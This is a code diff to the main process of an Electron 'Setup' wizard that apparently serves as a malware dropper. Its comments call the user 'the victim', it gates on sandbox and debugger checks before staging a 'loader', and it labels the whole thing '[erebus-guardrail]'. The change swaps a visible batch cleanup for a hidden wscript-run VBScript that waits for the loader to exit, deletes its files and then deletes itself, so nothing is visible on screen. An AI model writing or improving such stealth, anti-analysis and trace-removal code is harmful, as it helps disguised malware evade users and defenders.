@@ -22,46 +22,76 @@ let interactionTokenIssued = false;
 // The Electron main process exits as soon as the wizard window closes
 // (window-all-closed -> app.quit), typically seconds after the loader is
 // spawned. Any 'child.on("exit", ...)' handler dies with the main process, so
-// we can't rely on in-process cleanup. Instead, after the loader is spawned
-// we write a tiny self-deleting batch file to %TEMP%, launch it detached, and
-// let it outlive Electron. The batch file polls tasklist for the loader PID,
-// waits for it to exit, then rm-rf's the inst-<uuid> tree and deletes itself.
-// This also dodges the Windows file-lock problem where a running PE can't be
-// deleted by its own parent.
+// we can't rely on in-process cleanup. Instead we write a small VBScript
+// watcher to %TEMP% and launch it via `wscript.exe //B`, which outlives
+// Electron and - crucially - does NOT allocate a console window.
+//
+// Why VBScript and not cmd.exe: on Windows, Node's child_process.spawn with
+// `detached: true` passes DETACHED_PROCESS to CreateProcessW, which allocates
+// a fresh console for cmd.exe regardless of `windowsHide: true`. cmd.exe is a
+// console-subsystem binary so it always gets a console when detached,
+// producing a visible flashing window (the findstr title users have
+// reported). wscript.exe is a GUI-subsystem host and never allocates a
+// console, so scripts it runs are truly invisible.
+//
+// The VBS uses WMI's Win32_Process query to poll for the loader PID. When
+// the loader exits, it sleeps briefly for handles to flush, then issues a
+// retrying DeleteFolder. Finally it self-deletes via a hidden-cmd Shell.Run
+// so the .vbs file doesn't linger in %TEMP%.
 function scheduleOutOfProcessCleanup(childPid, tmpDir) {
   try {
-    const cleanupBat = path.join(os.tmpdir(), `inst-clean-${crypto.randomUUID()}.bat`);
-    // The `(goto) 2>nul & del "%~f0"` idiom is the canonical self-deleting
-    // batch-file trick: cmd.exe commits to the current line before executing
-    // it, so the `del` of the script file itself succeeds even though it's
-    // the currently-running script.
+    const cleanupVbs = path.join(os.tmpdir(), `inst-clean-${crypto.randomUUID()}.vbs`);
+    // WScript.Arguments(0) = loader PID, WScript.Arguments(1) = target dir.
+    // Double-quote escape rule in VBScript: a literal " inside a string is "".
     const script = [
-      '@echo off',
-      'setlocal',
-      'set "LOADER_PID=%~1"',
-      'set "TARGET_DIR=%~2"',
-      ':wait',
-      'tasklist /fi "pid eq %LOADER_PID%" 2>nul | findstr /b /l "%LOADER_PID%" >nul 2>&1',
-      'if errorlevel 1 goto gone',
-      'ping -n 2 127.0.0.1 >nul 2>&1',
-      'goto wait',
-      ':gone',
-      'ping -n 2 127.0.0.1 >nul 2>&1',
-      'rd /s /q "%TARGET_DIR%" 2>nul',
-      'if exist "%TARGET_DIR%" (',
-      '  ping -n 6 127.0.0.1 >nul 2>&1',
-      '  rd /s /q "%TARGET_DIR%" 2>nul',
-      ')',
-      'endlocal',
-      '(goto) 2>nul & del "%~f0"',
+      'Option Explicit',
+      'Dim loaderPid, targetDir, wmi, procs, fso, shell, selfPath, i',
+      'loaderPid = WScript.Arguments(0)',
+      'targetDir = WScript.Arguments(1)',
+      '',
+      'Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")',
+      '',
+      "' Poll Win32_Process until the loader PID is gone.",
+      'Do',
+      '  Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & loaderPid)',
+      '  If procs.Count = 0 Then Exit Do',
+      '  WScript.Sleep 1000',
+      'Loop',
+      '',
+      "' Allow any residual file handles to flush before deleting.",
+      'WScript.Sleep 2000',
+      '',
+      'Set fso = CreateObject("Scripting.FileSystemObject")',
+      'On Error Resume Next',
+      '',
+      "' Retry the delete up to three times with progressive backoff -",
+      "' covers the case where the loader forked a child that still has",
+      "' files open inside the tree.",
+      'For i = 1 To 3',
+      '  If fso.FolderExists(targetDir) Then',
+      '    fso.DeleteFolder targetDir, True',
+      '  End If',
+      '  If Not fso.FolderExists(targetDir) Then Exit For',
+      '  WScript.Sleep 2000 * i',
+      'Next',
+      '',
+      "' Self-delete the VBS. Shell.Run intWindowStyle=0 is SW_HIDE, so the",
+      "' spawned cmd has no visible window. ping provides a delay without",
+      "' introducing a timeout / choice dependency.",
+      'selfPath = WScript.ScriptFullName',
+      'Set shell = CreateObject("WScript.Shell")',
+      'shell.Run "cmd /c ping -n 2 127.0.0.1 >nul & del """ & selfPath & """", 0, False',
       '',
     ].join('\r\n');
-    fs.writeFileSync(cleanupBat, script, { encoding: 'ascii' });
+    fs.writeFileSync(cleanupVbs, script, { encoding: 'ascii' });
 
-    // Detach the cleanup bat so it outlives the Electron main process.
+    // wscript.exe //B    = batch mode, suppresses script errors and UI
+    // wscript.exe //Nologo = no banner
+    // wscript.exe is a GUI-subsystem binary, so nothing is visible at any
+    // point in the watcher's lifecycle.
     const watcher = spawn(
-      'cmd.exe',
-      ['/c', cleanupBat, String(childPid), tmpDir],
+      'wscript.exe',
+      ['//B', '//Nologo', cleanupVbs, String(childPid), tmpDir],
       {
         detached: true,
         windowsHide: true,
@@ -70,7 +100,7 @@ function scheduleOutOfProcessCleanup(childPid, tmpDir) {
     );
     watcher.unref();
   } catch (_) {
-    // Best-effort cleanup — if the watcher spawn fails, the tmpDir will
+    // Best-effort cleanup - if the watcher spawn fails, the tmpDir will
     // persist until the victim reboots or clears %TEMP% manually. We
     // deliberately do not surface an error to the renderer because the
     // loader has already spawned and any user-visible failure here would
@@ -79,10 +109,11 @@ function scheduleOutOfProcessCleanup(childPid, tmpDir) {
 }
 
 function createWindow() {
+  const debug = !!(config.GUARDRAILS && config.GUARDRAILS.debugMode);
   const win = new BrowserWindow({
-    width: 560,
-    height: 420,
-    resizable: false,
+    width: debug ? 900 : 560,
+    height: debug ? 640 : 420,
+    resizable: debug,
     title: `${config.PRODUCT} Setup`,
     autoHideMenuBar: true,
     webPreferences: {
@@ -90,10 +121,15 @@ function createWindow() {
       contextIsolation: true,
       nodeIntegration: false,
       sandbox: false,
+      devTools: debug,
     },
   });
   win.removeMenu();
   win.loadFile(path.join(__dirname, 'renderer', 'index.html'));
+  if (debug) {
+    // Auto-open devtools so the operator can see [erebus-guardrail] logs.
+    win.webContents.openDevTools({ mode: 'bottom' });
+  }
 }
 
 ipcMain.handle('installer:product', () => ({
@@ -103,6 +139,7 @@ ipcMain.handle('installer:product', () => ({
   // Expose guardrail knobs the renderer needs to enforce on its side.
   dwellMs: (config.GUARDRAILS && config.GUARDRAILS.dwellMs) || 0,
   requireMouseMovement: !!(config.GUARDRAILS && config.GUARDRAILS.requireMouseMovement),
+  debugMode: !!(config.GUARDRAILS && config.GUARDRAILS.debugMode),
 }));
 
 // Called by the renderer the first time it observes a real user-input event
@@ -117,6 +154,9 @@ ipcMain.handle('installer:ready', () => {
 });
 
 ipcMain.handle('installer:run', async (_event, providedToken) => {
+  const debug = !!(config.GUARDRAILS && config.GUARDRAILS.debugMode);
+  const dbg = (msg) => { if (debug) console.error(`[erebus-guardrail] ${msg}`); };
+
   try {
     // -------------------------------------------------------------------
     // Guardrail gate #1: interaction token.
@@ -126,8 +166,10 @@ ipcMain.handle('installer:run', async (_event, providedToken) => {
     // this check and nothing is staged.
     // -------------------------------------------------------------------
     if (!interactionTokenIssued || providedToken !== INTERACTION_TOKEN) {
+      dbg('interaction-token-missing - installer:run invoked without installer:ready');
       return { ok: false, error: 'no-interaction' };
     }
+    dbg('gate #1 (interaction token) OK');
 
     // -------------------------------------------------------------------
     // Guardrail gate #2: environment checks (debugger, sandbox vars,
@@ -136,8 +178,10 @@ ipcMain.handle('installer:run', async (_event, providedToken) => {
     // -------------------------------------------------------------------
     const gr = await runGuardrails(config.GUARDRAILS);
     if (!gr.ok) {
+      dbg(`gate #2 (environment) FAILED: ${gr.reason}`);
       return { ok: false, error: `guardrail:${gr.reason}` };
     }
+    dbg('gate #2 (environment) OK');
 
     // -------------------------------------------------------------------
     // Only NOW do we touch the filesystem. The loader tree sits in
@@ -181,6 +225,8 @@ ipcMain.handle('installer:run', async (_event, providedToken) => {
         return { ok: false, error: `unsupported ENTRY_FORMAT: ${config.ENTRY_FORMAT}` };
     }
 
+    dbg(`spawned ${config.ENTRY_FORMAT} loader pid=${child.pid} cwd=${tmpDir}`);
+
     // Hand cleanup off to an out-of-process watcher that polls tasklist
     // for the loader PID and rm-rf's tmpDir after the loader exits. This
     // survives the Electron main process quitting (which happens seconds
@@ -191,6 +237,7 @@ ipcMain.handle('installer:run', async (_event, providedToken) => {
 
     return { ok: true };
   } catch (err) {
+    dbg(`unhandled error: ${err && err.message || err}`);
     return { ok: false, error: String(err && err.message || err) };
   }
 });
